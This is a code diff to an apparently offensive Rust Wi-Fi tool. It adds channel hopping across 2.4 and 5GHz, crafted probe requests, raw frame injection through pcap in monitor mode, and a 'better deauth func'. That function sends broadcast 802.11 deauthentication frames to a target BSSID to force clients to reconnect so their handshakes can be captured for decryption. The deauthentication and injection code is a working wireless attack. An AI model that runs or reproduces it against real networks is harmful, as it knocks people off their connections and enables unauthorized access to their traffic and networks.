@@ -139,17 +139,33 @@ async fn main() -> Result<(), String> {
         }
     };
 
-    println!("Phase 2: Aggressive hidden SSID discovery");
-    match aggressive_ssid_discovery(&interface_name) {
-        Ok(hidden_mapping) => {
-            for (mac, ssid) in hidden_mapping {
-                mac_to_ssid.insert(mac, ssid);
+    if mac_to_ssid.is_empty() || std::env::args().any(|arg| arg == "--aggressive") {
+        println!("\nNetwork not found with basic discovery.");
+        println!("Switching to aggressive discovery techniques...");
+        
+        match aggressive_network_discovery(&interface_name) {
+            Ok(aggressive_mapping) => {
+                for (mac, ssid) in aggressive_mapping {
+                    mac_to_ssid.insert(mac, ssid);
+                }
+            },
+            Err(e) => {
+                eprintln!("Warning: Aggressive discovery failed: {}. Using basic results.", e);
             }
-        },
-        Err(e) => {
-            eprintln!("Warning: Aggressive discovery failed: {}. Using basic results.", e);
-        }
-    };
+        };
+    } else {
+        println!("Phase 2: Hidden SSID discovery");
+        match aggressive_ssid_discovery(&interface_name) {
+            Ok(hidden_mapping) => {
+                for (mac, ssid) in hidden_mapping {
+                    mac_to_ssid.insert(mac, ssid);
+                }
+            },
+            Err(e) => {
+                eprintln!("Warning: Hidden SSID discovery failed: {}. Using basic results.", e);
+            }
+        };
+    }
 
     // Set up decryption
     println!("Setting up decryption capabilities...");
@@ -342,18 +358,42 @@ fn find_wifi_interface() -> Option<String> {
 
 fn channel_hopping(interface: &str) {
     let wifi = WifiInterface::new(interface);
-    let channels = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13];
+    let channels_2ghz = [1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13];
+    let channels_5ghz = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165];
+    
+    println!("Starting channel hopping on both 2.4GHz and 5GHz bands");
+    
+    let supports_5ghz = wifi.set_channel(36).is_ok();
+    if supports_5ghz {
+        println!("Adapter supports 5GHz! Will scan both bands.");
+    } else {
+        println!("Adapter appears to only support 2.4GHz. Limited to those channels.");
+    }
     
     loop {
-        for &channel in &channels {
+        for &channel in &channels_2ghz {
             if let Err(e) = wifi.set_channel(channel) {
-                eprintln!("Failed to set channel {}: {}", channel, e);
+                eprintln!("Failed to set 2.4GHz channel {}: {}", channel, e);
+            } else {
+                println!("Hopping to channel {} (2.4GHz)", channel);
             }
-            std::thread::sleep(Duration::from_millis(250));
+            std::thread::sleep(Duration::from_millis(1000));
+        }
+        
+        if supports_5ghz {
+            for &channel in &channels_5ghz {
+                if let Err(e) = wifi.set_channel(channel) {
+                    if !e.contains("Invalid argument") {
+                        eprintln!("Failed to set 5GHz channel {}: {}", channel, e);
+                    }
+                } else {
+                    println!("Hopping to channel {} (5GHz)", channel);
+                }
+                std::thread::sleep(Duration::from_millis(1000));
+            }
         }
     }
 }
-
 
 fn lock_to_channel(interface_name: &str, channel: u8) -> Result<(), String> {
     println!("Locking to channel {} for continuous monitoring", channel);
@@ -829,5 +869,173 @@ fn wait_for_handshakes(interface_name: &str, decryptor: &mut Decryptor, mac_to_s
         println!("Captured handshakes for some networks. Monitoring will continue.");
     }
     
+    Ok(())
+}
+
+fn send_probe_requests(interface_name: &str, target_ssids: &[String]) -> Result<(), String> {
+    println!("🔍 Sending probe requests to actively discover networks...");
+    println!("This is a more aggressive technique that will make networks respond.");
+    
+    let mac_addr = get_interface_mac(interface_name)?;
+    println!("Using interface MAC: {}", mac_addr);
+    
+    if !target_ssids.is_empty() {
+        for ssid in target_ssids {
+            println!("Probing for network: {}", ssid);
+            send_probe_request(interface_name, ssid, &mac_addr)?;
+            std::thread::sleep(Duration::from_millis(200));
+            send_probe_request(interface_name, ssid, &mac_addr)?;
+            std::thread::sleep(Duration::from_millis(300));
+        }
+    } else {
+        println!("Sending broadcast probe request");
+        send_probe_request(interface_name, "", &mac_addr)?;
+        std::thread::sleep(Duration::from_millis(200));
+        send_probe_request(interface_name, "", &mac_addr)?;
+    }
+    
+    println!("Probe requests sent successfully.");
+    Ok(())
+}
+
+fn send_probe_request(interface_name: &str, ssid: &str, src_mac: &str) -> Result<(), String> {
+    println!("Sending probe request for SSID: \"{}\"", if ssid.is_empty() { "[Broadcast]" } else { ssid });
+    
+    let src_mac_bytes = mac_str_to_bytes(src_mac)
+        .map_err(|_| format!("Invalid MAC address format: {}", src_mac))?;
+    
+    let broadcast_addr: [u8; 6] = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
+    
+    let mut frame = Vec::new();
+    
+    frame.push(0x40); 
+    frame.push(0x00); 
+    
+    frame.push(0x00);
+    frame.push(0x00);
+    
+    frame.extend_from_slice(&broadcast_addr);
+    frame.extend_from_slice(&src_mac_bytes);
+    frame.extend_from_slice(&broadcast_addr);
+    
+    frame.push(0x00);
+    frame.push(0x00);
+    
+    frame.push(0x00); 
+    frame.push(ssid.len() as u8); 
+    frame.extend_from_slice(ssid.as_bytes()); 
+    
+    frame.push(0x01); // Element ID: Supported Rates
+    frame.push(0x08); // Length
+    frame.push(0x82); // 1 Mbps (basic rate)
+    frame.push(0x84); // 2 Mbps (basic rate)
+    frame.push(0x8B); // 5.5 Mbps (basic rate)
+    frame.push(0x96); // 11 Mbps (basic rate)
+    frame.push(0x0C); // 6 Mbps
+    frame.push(0x12); // 9 Mbps
+    frame.push(0x18); // 12 Mbps
+    frame.push(0x24); // 18 Mbps
+    
+    frame.push(0x32); // Element ID: Extended Supported Rates
+    frame.push(0x04); // Length
+    frame.push(0x30); // 24 Mbps
+    frame.push(0x48); // 36 Mbps
+    frame.push(0x60); // 48 Mbps
+    frame.push(0x6C); // 54 Mbps
+    
+    inject_raw_frame(interface_name, &frame)
+}
+
+// Better deauth func
+fn deauthenticate_network(interface_name: &str, bssid: &str) -> Result<(), String> {
+    println!("🔥 Sending deauthentication packets to network: {}", bssid);
+    println!("This will force connected devices to reconnect, generating handshakes.");
+    
+    let bssid_bytes = mac_str_to_bytes(bssid)
+        .map_err(|_| format!("Invalid BSSID format: {}", bssid))?;
+    
+    let broadcast_addr: [u8; 6] = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
+    
+    let mut frame = Vec::new();
+    
+    frame.push(0xC0);
+    frame.push(0x00); 
+    frame.push(0x00);
+    frame.push(0x00);
+    frame.extend_from_slice(&broadcast_addr);
+    frame.extend_from_slice(&bssid_bytes);
+    frame.extend_from_slice(&bssid_bytes);
+    frame.push(0x00);
+    frame.push(0x00);
+    frame.push(0x01);
+    frame.push(0x00);
+    
+    for i in 0..5 {
+        println!("Sending deauth frame {}/5...", i+1);
+        inject_raw_frame(interface_name, &frame)?;
+        std::thread::sleep(std::time::Duration::from_millis(100));
+    }
+    
+    println!("Deauthentication packets sent successfully.");
+    Ok(())
+}
+
+fn mac_str_to_bytes(mac: &str) -> Result<[u8; 6], &'static str> {
+    let parts: Vec<&str> = mac.split(':').collect();
+    if parts.len() != 6 {
+        return Err("Invalid MAC address format");
+    }
+    
+    let mut bytes = [0u8; 6];
+    for (i, part) in parts.iter().enumerate() {
+        bytes[i] = u8::from_str_radix(part, 16).map_err(|_| "Invalid hex in MAC address")?;
+    }
+    
+    Ok(bytes)
+}
+
+
+fn add_radiotap_header(frame: &[u8]) -> Vec<u8> {
+    let mut complete_frame = Vec::new();
+    
+    complete_frame.push(0x00);
+    complete_frame.push(0x00);
+    complete_frame.push(0x08);
+    complete_frame.push(0x00);
+    complete_frame.push(0x00);
+    complete_frame.push(0x00);
+    complete_frame.push(0x00);
+    complete_frame.push(0x00);
+    
+    complete_frame.extend_from_slice(frame);
+    
+    complete_frame
+}
+
+
+fn inject_raw_frame(interface_name: &str, frame_data: &[u8]) -> Result<(), String> {
+    let complete_frame = add_radiotap_header(frame_data);
+    
+    let devices = pcap::Device::list()
+        .map_err(|e| format!("Failed to list devices: {}", e))?;
+    
+    let device = devices.into_iter()
+        .find(|d| d.name == interface_name)
+        .ok_or_else(|| format!("Device {} not found", interface_name))?;
+    
+    let mut cap = pcap::Capture::from_device(device)
+        .map_err(|e| format!("Failed to open device: {}", e))?
+        .promisc(true)
+        .rfmon(true)
+        .snaplen(65535)
+        .timeout(1000)
+        .open()
+        .map_err(|e| format!("Failed to open capture: {}", e))?;
+    
+    cap.sendpacket(&complete_frame)
+        .map_err(|e| format!("Failed to send packet: {}", e))?;
+    
+    println!("Successfully sent {} byte frame (with {} byte RadioTap header)", 
+             complete_frame.len(), complete_frame.len() - frame_data.len());
     Ok(())
 }
